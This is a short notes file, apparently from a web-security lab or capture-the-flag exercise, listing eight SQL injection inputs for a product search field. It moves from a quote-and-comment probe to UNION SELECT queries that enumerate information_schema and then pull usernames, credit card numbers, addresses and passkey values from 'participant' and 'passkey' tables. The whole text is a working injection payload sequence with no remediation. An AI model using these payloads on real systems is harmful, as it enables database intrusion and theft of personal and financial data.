# Injection options

1. <empty> -> Displays everything

2. water -> Displays water related 

3. ';# -> Displays everything

4. water%' UNION (SELECT 1,2,3,4 FROM dual);#
	-> Proves we can SQL Inject

5. water%' UNION (SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 FROM information_schema.tables);#
	-> Grabs info from information_tables

6. water%' UNION (SELECT 1,COLUMN_NAME,3,4 FROM information_schema.columns WHERE TABLE_NAME = 'participant');#
	-> TO grab participant info

7. water%' UNION (SELECT idparticipant,username,ccnum,address FROM participant);#
	-> Gets participant specific info

8.  water%' UNION (SELECT  null,idpasskey,value,idparticipant FROM passkey);#
  -> Gets passkey table info